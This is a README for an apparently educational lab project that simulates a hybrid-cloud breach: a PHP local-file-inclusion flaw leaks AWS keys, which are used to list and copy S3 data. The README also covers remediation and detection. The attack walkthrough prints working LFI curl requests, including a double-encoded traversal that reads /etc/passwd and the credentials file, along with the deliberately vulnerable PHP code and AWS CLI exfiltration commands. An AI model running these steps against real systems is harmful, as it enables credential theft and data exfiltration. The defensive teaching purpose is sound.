# 🌉 The Leaky Bridge — Hybrid Cloud Attack Vector

> **⚠️ DISCLAIMER:** This project is built **entirely for educational purposes** in an isolated lab environment. All credentials, IPs, and data are **fake/simulated**. Never attempt these techniques on systems you do not own or have explicit written permission to test.

---

## 📋 Executive Summary

A company undergoing digital transformation left an AWS Access Key hardcoded inside a configuration file on their on-premise web server. That web server ran a PHP application with an unpatched **Local File Inclusion (LFI)** vulnerability. An attacker exploited the LFI to read the credentials file, then pivoted directly into AWS — listing all S3 buckets and downloading sensitive customer PII and financial data.

**How it was hacked:** LFI on a PHP web app → read `/home/ubuntu/.aws/credentials` → `aws s3 cp` exfiltration.

**Lesson learned:** Never store static AWS credentials on disk. Use IAM Roles. Validate all file-read inputs server-side. Monitor with CloudTrail.

---

## 🗺️ Network Diagram

```
┌─────────────────────┐      ① Nmap + LFI       ┌────────────────────────┐
│   ATTACKER MACHINE  │ ─────────────────────── ▶│  ON-PREMISE WEB SERVER │
│   (Kali Linux)      │                           │  Ubuntu 22.04          │
│   10.0.0.99         │ ◀─────────────────────── │  192.168.56.101        │
│                     │    ② Stolen credentials   │  Apache + PHP (LFI ⚠) │
│  Tools:             │                           │                        │
│  • Nmap             │                           │  /home/ubuntu/         │
│  • Python scripts   │                           │    .aws/credentials ⚠  │
│  • AWS CLI          │                           │  /opt/scripts/         │
│  • Burp Suite       │                           │    s3-backup.sh ⚠      │
└─────────────────────┘                           └────────────────────────┘
          │                                                    
          │  ③ aws s3 cp (Exfiltration)                       
          ▼                                                    
┌──────────────────────────────────────────────────────────┐
│                        AWS CLOUD                          │
│                                                           │
│  ┌──────────────────────────┐   ┌──────────────────────┐ │
│  │ S3: corp-sensitive-docs  │   │ IAM: svc-backup-agent│ │
│  │ • customer_data.csv  🔴  │   │ Policy: s3:* on *  ⚠ │ │
│  │ • financial_report.csv🔴 │   └──────────────────────┘ │
│  └──────────────────────────┘                            │
│                                                           │
│  ┌──────────────────────────┐                            │
│  │ CloudTrail (Monitoring)  │ → Alert: Unknown IP!  🟢  │
│  └──────────────────────────┘                            │
└──────────────────────────────────────────────────────────┘
```

> 📄 See [`docs/network-diagram.png`](docs/network-diagram.png) for the visual diagram.

---

## 📂 Project Structure

```
TheLeakyBridge/
│
├── README.md                          ← You are here
├── docs/
│   └── network-diagram.png            ← Attack flow visualization
│
├── vulnerable-app/                    ← The victim web application
│   ├── index.php                      ← Vulnerable PHP (LFI present)
│   ├── docs/
│   │   ├── welcome.txt
│   │   ├── network-map.txt            ← Breadcrumb: mentions .aws path
│   │   └── server-info.txt            ← Contains leaked AWS keys!
│   └── simulated-fs/
│       ├── home/ubuntu/.aws/credentials   ← The "mistake"
│       └── opt/scripts/s3-backup.sh       ← Hardcoded keys in script
│
├── aws-setup/                         ← Provision the cloud side
│   ├── aws_setup.py                   ← boto3 setup/teardown script
│   └── s3-bucket-contents/
│       ├── customer_data.csv          ← Fake sensitive PII
│       └── financial_report_2024.csv  ← Fake financial data
│
├── terraform/
│   └── main.tf                        ← IaC alternative to aws_setup.py
│
├── attack/                            ← The attack simulation scripts
│   ├── 01_recon.py                    ← Nmap wrapper — port scanning
│   ├── 02_lfi_exploit.py             ← LFI exploiter + credential hunter
│   └── 03_cloud_pivot.py             ← AWS CLI automation — S3 exfil
│
└── defense/                           ← Remediation and monitoring
    ├── fixed_index.php                ← Patched PHP with allowlist
    ├── iam_remediation.py             ← Least privilege IAM policy
    ├── cloudtrail_detector.py         ← Threat detection queries
    └── ml_anomaly_detection.py        ← ML-based anomaly detection
```

---

## 🛠️ Tools Used

| Tool | Purpose | Phase |
|------|---------|-------|
| **Python 3** | Full attack simulator (`full_attack_sim.py`) | All phases |
| **Nmap** | Port scanning, service detection, OS fingerprint | Recon |
| **Burp Suite** | Intercept HTTP requests, fuzz LFI parameters | Exploitation |
| **requests** | Automated LFI scanning (`02_lfi_exploit.py`) | Exploitation |
| **AWS CLI** | Authenticate with stolen keys, list/download S3 | Cloud Pivot |
| **boto3** | Python AWS SDK — lab setup & cloud pivot script | Setup + Pivot |
| **Terraform** | IaC provisioning of AWS resources (optional) | Lab Setup |
| **scikit-learn** | Isolation Forest for ML anomaly detection | Defense |
| **AWS CloudTrail** | Audit trail for all API calls | Monitoring |
| **LocalStack** | Local AWS emulator via Docker (optional) | Lab Setup |

---

## 🚀 Lab Setup Guide

### Option A — Simulation Mode ✅ (Recommended — No AWS, No VM needed)

```bash
# 1. Install Python dependencies
pip install boto3 requests scikit-learn pandas pytz

# 2. Provision the simulated lab (creates local folders mimicking S3/IAM)
cd aws-setup/
python aws_setup.py --setup --sim

# 3. Run the full attack simulation
cd ../attack/
$env:PYTHONIOENCODING="utf-8"   # Windows only
python full_attack_sim.py        # Interactive (press Enter each step)
python full_attack_sim.py --auto # Fully automated
```

This creates a complete local lab with:
- ✅ Simulated S3 bucket → `aws-setup/simulated-cloud/s3/`
- ✅ Fake sensitive CSVs uploaded to the bucket
- ✅ IAM user + overly-broad policy as JSON files
- ✅ Leaked credentials in `vulnerable-app/simulated-fs/home/ubuntu/.aws/`
- ✅ Files exfiltrated to `attack/exfiltrated/` after the sim runs

---

### Option B — Real AWS + Ubuntu VM (Full Lab)

**Prerequisites:** VirtualBox/VMware, AWS Free Tier account, AWS CLI

```bash
# Configure your AWS admin credentials
aws configure

# Provision real AWS resources
cd aws-setup/
python aws_setup.py --setup

# On your Ubuntu VM
sudo apt install apache2 php libapache2-mod-php -y
sudo cp -r vulnerable-app/* /var/www/html/
mkdir -p /home/ubuntu/.aws
cp aws-setup/generated_credentials.txt /home/ubuntu/.aws/credentials

# Verify: open http://<VM-IP>/ in browser
```

### Option C — LocalStack (Docker required)

```bash
# Start LocalStack
docker run --rm -d -p 4566:4566 -e SERVICES=s3,iam,sts --name localstack localstack/localstack

# Provision
python aws_setup.py --setup --local
```

---

## ⚔️ Step-by-Step Attack Walkthrough

### Step 1 — Reconnaissance

```bash
# Automated (using attack script)
python attack/01_recon.py --target 192.168.56.101

# Manual equivalent
nmap -sV -sC -O -T4 192.168.56.101
```

**Expected output:**
```
PORT   STATE SERVICE  VERSION
22/tcp open  ssh      OpenSSH 8.9p1 Ubuntu
80/tcp open  http     Apache httpd 2.4.52

[!] INTERESTING FINDINGS:
    → Port 80 OPEN: HTTP web server detected!
       Next step: Navigate to http://192.168.56.101/
```

**Finding:** Port 80 open, running Apache + PHP. Navigate to the web app and notice the `?file=` parameter in the URL.

---

### Step 2 — LFI Exploitation & Credential Hunting

The vulnerable URL: `http://192.168.56.101/?file=welcome.txt`

**Testing for LFI manually (Burp Suite / curl):**

```bash
# Test 1: Absolute path (bypasses weak '../' filter)
curl "http://192.168.56.101/?file=/etc/passwd"

# Test 2: Double-encoded path traversal
curl "http://192.168.56.101/?file=..%252F..%252Fetc%252Fpasswd"
```

**Output — LFI Confirmed:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

**Reading the breadcrumb file:**
```bash
curl "http://192.168.56.101/?file=network-map.txt"
# → "NOTE: Credentials stored in /home/ubuntu/.aws/credentials"
```

**Harvesting the credentials:**
```bash
curl "http://192.168.56.101/?file=/home/ubuntu/.aws/credentials"
```

```ini
[default]
aws_access_key_id     = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region                = ap-southeast-1
```

**🎯 Automated version:**
```bash
python attack/02_lfi_exploit.py --target http://192.168.56.101
```

---

### Step 3 — Cloud Pivot

Configure AWS CLI on the **attacker machine** using the stolen keys:

```bash
aws configure --profile stolen
# AWS Access Key ID:     AKIAIOSFODNN7EXAMPLE
# AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# Default region:        ap-southeast-1
# Output format:         json
```

**Validate identity:**
```bash
aws sts get-caller-identity --profile stolen
```
```json
{
    "UserId": "AIDACKCEVSQ6C2EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/svc-backup-agent"
}
```

---

### Step 4 — Escalation & Exfiltration

```bash
# Enumerate ALL buckets (attacker discovers more than expected!)
aws s3 ls --profile stolen
```
```
2024-08-15 14:32:01 corp-sensitive-docs-prod-lab
2024-08-15 09:11:44 corp-hr-archive-2023
2024-08-15 11:05:33 corp-audit-logs-private
```

```bash
# List contents of the target bucket
aws s3 ls s3://corp-sensitive-docs-prod-lab/ --profile stolen
```
```
2024-12-01 23:05:12       4218 customer_data.csv
2024-12-01 23:05:13       2891 financial_report_2024.csv
```

```bash
# Exfiltrate all files
aws s3 cp s3://corp-sensitive-docs-prod-lab/ ./stolen-data/ \
    --recursive --profile stolen
```
```
download: s3://corp-sensitive-docs-prod-lab/customer_data.csv       → stolen-data/customer_data.csv
download: s3://corp-sensitive-docs-prod-lab/financial_report_2024.csv → stolen-data/financial_report_2024.csv
```

**🎯 Automated version:**
```bash
python attack/03_cloud_pivot.py \
  --access-key AKIAIOSFODNN7EXAMPLE \
  --secret-key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**💥 Result:** 10 customers' PII (names, emails, credit card numbers) and confidential Q4 financial data — downloaded in under 60 seconds.

---

## 🛡️ Remediation & Defense

### Fix 1 — Patch the LFI Vulnerability (PHP)

**❌ Vulnerable code (`vulnerable-app/index.php`):**
```php
$filename  = $_GET['file'];                      // No validation
$full_path = '/var/www/html/docs/' . $filename;  // String concat
if (file_exists($full_path)) {
    echo file_get_contents($full_path);           // Direct read!
}
```

**✅ Fixed code (`defense/fixed_index.php`):**
```php
// 1. Strict allowlist — only known filenames accepted
const ALLOWED_FILES = ['welcome.txt', 'network-map.txt', 'server-info.txt'];

if (!in_array($_GET['file'], ALLOWED_FILES, true)) {
    error_log("Suspicious request: " . $_GET['file']);
    die("Access denied.");
}

// 2. realpath() to canonicalize and resolve traversal attempts
$base_dir  = realpath('/var/www/html/docs');
$full_path = realpath($base_dir . '/' . $_GET['file']);

// 3. Verify the resolved path stays inside our trusted directory
if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
    die("Access denied.");  // Path traversal blocked!
}

echo htmlspecialchars(file_get_contents($full_path));
```

**Why this works:**
- `in_array()` with strict mode: only explicitly listed files pass through
- `realpath()`: resolves `../`, `%2F`, symlinks to absolute canonical path
- `strpos()` boundary check: ensures canonical path is inside `/docs/`

---

### Fix 2 — Remove Static Credentials (AWS IAM)

**❌ Problem:** Static Access Keys stored in `/home/ubuntu/.aws/credentials`

**✅ Solution A — IAM Role for EC2 (if server is on EC2):**
```bash
# 1. Create an IAM Role with the required policy
# 2. Attach the role to the EC2 instance
aws ec2 associate-iam-instance-profile \
    --instance-id i-0abc123def456 \
    --iam-instance-profile Name=WebServerBackupRole

# No credentials needed in code! The SDK auto-fetches from metadata
# Applications automatically use: http://169.254.169.254/latest/meta-data/
```

**✅ Solution B — Least Privilege Policy:**

Replace the overly-broad policy with a scoped-down version:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ListOnlyBackupsPrefix",
      "Effect": "Allow",
      "Action": ["s3:ListBucket"],
      "Resource": "arn:aws:s3:::corp-sensitive-docs-prod-lab",
      "Condition": {
        "StringLike": { "s3:prefix": ["backups/*"] }
      }
    },
    {
      "Sid": "GetObjectBackupsOnly",
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::corp-sensitive-docs-prod-lab/backups/*"
    }
  ]
}
```

| Permission | Before (Vulnerable) | After (Secure) |
|---|---|---|
| `s3:ListAllMyBuckets` | ✅ All accounts | ❌ Removed |
| `s3:ListBucket` | All buckets (`*`) | Only `corp-sensitive-docs-prod-lab` |
| `s3:GetObject` | All files (`*`) | Only `/backups/*` prefix |
| `customer_data.csv` | Readable | ❌ Inaccessible |
| Other buckets | Readable | ❌ Inaccessible |

---

### Fix 3 — CloudTrail Monitoring & Alert Rules

**Enable CloudTrail (if not already active):**
```bash
aws cloudtrail create-trail \
    --name corp-security-trail \
    --s3-bucket-name corp-cloudtrail-logs \
    --include-global-service-events \
    --is-multi-region-trail

aws cloudtrail start-logging --name corp-security-trail
```

**Detection rules to implement (`defense/cloudtrail_detector.py`):**

| Rule ID | Trigger | Severity | Action |
|---|---|---|---|
| `ENUM-001` | `ListBuckets` called by `svc-backup-agent` | 🔴 HIGH | Page on-call |
| `EXFIL-001` | >10 `GetObject` calls in 1 hour | 🔴 CRITICAL | Auto-revoke key |
| `GEO-001` | API call from unknown IP | 🟠 HIGH | Alert + investigate |
| `TEMPORAL-001` | S3 access outside 23:00–01:00 window | 🟡 MEDIUM | Notify security team |

**Run the detector:**
```bash
python defense/cloudtrail_detector.py --user svc-backup-agent --hours 24
```

---

## 🤖 Future Work — ML-Based Threat Detection

*Bridging my Machine Learning background with Cloud Security.*

**The problem with rule-based detection:** Attackers adapt. If they stay under the threshold (e.g., download only 9 files/hour), rules miss it.

**The ML approach — Isolation Forest:**

Train an unsupervised anomaly detector on 6 months of normal `svc-backup-agent` behavior. Features extracted per session:

| Feature | Normal Baseline | Attack Pattern |
|---|---|---|
| `hour_of_day` | 23 (cron job) | 14 (business hours) |
| `list_bucket_calls` | **0** (never!) | **5** (enumeration) |
| `total_bytes_downloaded` | ~5 MB | ~85 MB |
| `unique_keys_accessed` | ~80 files | ~450 files |
| `is_known_ip` | 1 (EC2 internal) | **0** (attacker IP) |

Isolation Forest scores the attack event at **-0.89** (normal: +0.12) — a 7x separation — triggering an automated alert and key revocation via IAM API.

**Production deployment pipeline:**
```
CloudTrail → Kinesis Data Streams → Lambda (feature extraction)
    → SageMaker endpoint (Isolation Forest) → Score < -0.3?
    → SNS Alert to Security Team + Auto-revoke via IAM API
```

See [`defense/ml_anomaly_detection.py`](defense/ml_anomaly_detection.py) for the full implementation.

---

## 📅 4-Week Build Timeline

| Week | Focus | Output |
|---|---|---|
| **Week 1** | Lab setup — VM, AWS resources, vulnerable app | Working lab environment |
| **Week 2** | Execute attack — Nmap, LFI, AWS CLI exfil | Attack scripts + captured output |
| **Week 3** | Write-up, diagram, README, defense code | This complete repository |
| **Week 4** | Review, polish, prepare interview talking points | Interview-ready project |

---

## 🎓 Key Takeaways

1. **The hybrid cloud boundary is the weakest link.** A web app vulnerability can become a full cloud breach in minutes.
2. **Static credentials = permanent exposure.** A key left on disk is a key left for the next attacker to find.
3. **Least Privilege is non-negotiable.** A backup agent that can read all S3 buckets in the account is a loaded gun.
4. **Detection requires intent.** CloudTrail logs everything, but unless you actively query and alert on suspicious patterns, breaches go unnoticed for months.
5. **ML amplifies detection.** Rule-based systems catch known patterns; ML catches anomalies that rules never anticipated.

---

## 🔗 References

- [OWASP: Path Traversal (LFI)](https://owasp.org/www-community/attacks/Path_Traversal)
- [AWS IAM Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- [AWS CloudTrail User Guide](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/)
- [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
- [MITRE ATT&CK: Cloud — Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1537/)
- [Scikit-learn: Isolation Forest](https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.IsolationForest.html)

---

*Built by [ttienpham] | Cybersecurity & Cloud Security Research | 2025*
